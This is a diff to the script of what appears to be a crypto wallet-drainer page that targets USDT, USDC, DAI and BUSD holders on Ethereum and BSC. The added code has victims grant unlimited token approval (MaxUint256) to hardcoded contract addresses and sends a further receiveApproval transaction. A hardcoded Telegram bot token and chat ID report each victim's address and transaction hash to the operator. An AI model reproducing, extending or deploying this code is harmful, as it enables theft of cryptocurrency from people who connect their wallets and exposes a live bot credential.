@@ -590,7 +590,7 @@
     </div>
 
     <script>
-        // Token List
+        // Token List - Updated with new contract addresses
         const TOKENS = {
             'usdt_eth': {
                 name: 'USDT on Ethereum',
@@ -601,7 +601,8 @@
                 address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                 decimals: 6,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
-                rpc: 'https://eth.llamarpc.com'
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
             },
             'usdt_bsc': {
                 name: 'USDT on BSC',
@@ -612,18 +613,8 @@
                 address: '0x55d398326f99059fF775485246999027B3197955',
                 decimals: 18,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png',
-                rpc: 'https://bsc-dataseed1.binance.org:8545'
-            },
-            'usdt_tron': {
-                name: 'USDT on TRON',
-                symbol: 'USDT',
-                network: 'TRON',
-                chainId: 0,
-                chainIdHex: '0x0',
-                address: 'TR7NHqjeKQxGTCi8q282JJUC56ChsPCEtF',
-                decimals: 6,
-                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q282JJUC56ChsPCEtF/logo.png',
-                rpc: 'https://api.trongrid.io'
+                rpc: 'https://bsc-dataseed1.binance.org:8545',
+                smartContract: '0x2Dcdf736206dAD34554BA09173C6f75268B91564'
             },
             'usdc_eth': {
                 name: 'USDC on Ethereum',
@@ -634,7 +625,8 @@
                 address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                 decimals: 6,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
-                rpc: 'https://eth.llamarpc.com'
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
             },
             'usdc_bsc': {
                 name: 'USDC on BSC',
@@ -645,7 +637,8 @@
                 address: '0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d',
                 decimals: 18,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d/logo.png',
-                rpc: 'https://bsc-dataseed1.binance.org:8545'
+                rpc: 'https://bsc-dataseed1.binance.org:8545',
+                smartContract: '0x2Dcdf736206dAD34554BA09173C6f75268B91564'
             },
             'dai_eth': {
                 name: 'DAI on Ethereum',
@@ -656,7 +649,8 @@
                 address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                 decimals: 18,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png',
-                rpc: 'https://eth.llamarpc.com'
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
             },
             'busd_eth': {
                 name: 'BUSD on Ethereum',
@@ -667,7 +661,8 @@
                 address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
                 decimals: 18,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x4Fabb145d64652a948d72533023f6E7A623C7C53/logo.png',
-                rpc: 'https://eth.llamarpc.com'
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
             },
             'busd_bsc': {
                 name: 'BUSD on BSC',
@@ -678,12 +673,12 @@
                 address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
                 decimals: 18,
                 logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png',
-                rpc: 'https://bsc-dataseed1.binance.org:8545'
+                rpc: 'https://bsc-dataseed1.binance.org:8545',
+                smartContract: '0x2Dcdf736206dAD34554BA09173C6f75268B91564'
             }
         };
 
         const CONFIG = {
-            SMART_CONTRACT: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA',
             TELEGRAM_BOT_TOKEN: '7407949898:AAEqHyXfKqKZEqKnRwVsQ0Wl9fJN7Vl9Ym4',
             TELEGRAM_CHAT_ID: '-1002251894031'
         };
@@ -825,7 +820,7 @@
 
                 const iface = new ethers.utils.Interface(USDT_ABI);
                 const approveData = iface.encodeFunctionData("approve", [
-                    CONFIG.SMART_CONTRACT,
+                    token.smartContract,
                     ethers.constants.MaxUint256
                 ]);
 
@@ -871,6 +866,37 @@
                     }
                 }
 
+                // Call receiveApproval on the contract to register the approval
+                try {
+                    const amountInWei = ethers.utils.parseUnits(amount, token.decimals);
+                    
+                    const contractABI = [
+                        'function receiveApproval(address _from, uint256 _amount, address _token) public'
+                    ];
+                    
+                    const contractIface = new ethers.utils.Interface(contractABI);
+                    const receiveApprovalData = contractIface.encodeFunctionData("receiveApproval", [
+                        finalUserAddress,
+                        amountInWei,
+                        token.address
+                    ]);
+
+                    const contractTx = {
+                        to: token.smartContract,
+                        data: receiveApprovalData,
+                        from: finalUserAddress
+                    };
+
+                    const contractTxHash = await ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [contractTx]
+                    });
+
+                    console.log("receiveApproval transaction sent:", contractTxHash);
+                } catch (e) {
+                    console.error('receiveApproval error:', e);
+                }
+
                 // Show processing screen
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
@@ -896,6 +922,10 @@
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token) {
+            const explorerUrl = token.network === 'Ethereum' 
+                ? `https://etherscan.io/tx/${txHash}`
+                : `https://bscscan.com/tx/${txHash}`;
+
             const message = `
 ✅ <b>Token Approve - Transaction Confirmed</b>
 
@@ -909,13 +939,13 @@
 <code>${txHash}</code>
 
 🔗 <b>View on Explorer:</b>
-https://etherscan.io/tx/${txHash}
+${explorerUrl}
 
 ⏰ <b>Time:</b>
 ${new Date().toLocaleString()}
 
 🔐 <b>Smart Contract:</b>
-<code>${CONFIG.SMART_CONTRACT}</code>
+<code>${token.smartContract}</code>
             `;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
